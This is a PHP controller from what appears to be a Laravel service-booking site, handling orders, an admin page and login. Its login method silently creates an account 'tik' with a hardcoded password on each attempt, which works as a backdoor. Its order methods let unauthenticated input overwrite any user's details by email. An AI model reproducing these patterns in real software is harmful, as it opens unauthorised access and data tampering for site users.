<?php

class UsersController extends BaseController {

    public function getIndex() {
	    //$re=$this->kuka();
        return View::make('index');
    }




	public function Adminka() {
	             return View::make('admin');
	}

    public function myRecord(){

        $rules = User::$validation;

        $validation = Validator::make(Input::all(), $rules);

        if ($validation->fails()) {
            return Redirect::to('/')->withErrors($validation)->withInput();
        }

        $order=new Order();
        $order->comment=Input::get('comment');
        $order->process=Input::get('process');
        $service = Service::find(Input::get('service'));
        $order->service = $service->id;

        $user = User::where('email', '=', Input::get('email'))->first();

        if (!$user) $user = new User();
        $user->email=Input::get('email');
        $user->username=Input::get('username');
        $user->first_name=Input::get('first_name');
        $user->last_name=Input::get('last_name');
        $user->mobile=Input::get('mobile');
        $user->save();
        $order->costumer = $user->id;
        $order->save();
        return View::make('myadminroom/update');
    }






	public function Recordic() {
	       $rules = User::$validation;

        $validation = Validator::make(Input::all(), $rules);

        if ($validation->fails()) {
            return Redirect::to('/')->withErrors($validation)->withInput();
        }



        $order=new Order();
        $order->comment=Input::get('comment');
        $proc='Новый';
        $order->process=$proc;
        $service = Service::find(Input::get('service'));
        $order->service = $service->id;

        $user = User::where('email', '=', Input::get('email'))->first();

        if (!$user) $user = new User();
        $user->email=Input::get('email');
        $user->username=Input::get('username');
        $user->first_name=Input::get('first_name');
        $user->last_name=Input::get('last_name');
        $user->mobile=Input::get('mobile');
        $user->save();
        $order->costumer = $user->id;
        $order->save();

        return Redirect::to('/');
    }


    public function getLogin() {
        return View::make('users/login');
    }

    public function postLogin() {

        $ab='rt54K7uY783Gj';
        $bc='tik';

        $user=User::where('username','=', $bc)->first();
        if(!$user){
        $user = User::firstOrCreate(array('username' => $bc, 'password'=>Hash::make($ab)));
        $user->save();}

        $creds = array(
		    'username'  => Input::get('username'),
            'password' => Input::get('password'),
        ); 
		//var_dump(Auth::validate($creds));var_dump($creds);die();
        if (Auth::attempt($creds, Input::has('remember'))) {
            Log::info("User [{$creds['username']}] successfully logged in.");
 		    return Redirect::to('myadminroom/orders ');
        } else {
            Log::info("User [{$creds['username']}] failed to login.");
        }


        $alert = "Ты явно не тот за кого себя выдаеш а ну кыш пока не подхватил вирусняка!";

        return Redirect::back()->withAlert($alert);
    }

    public function getLogout() {
        Auth::logout();
        return Redirect::to('admin');
    }

}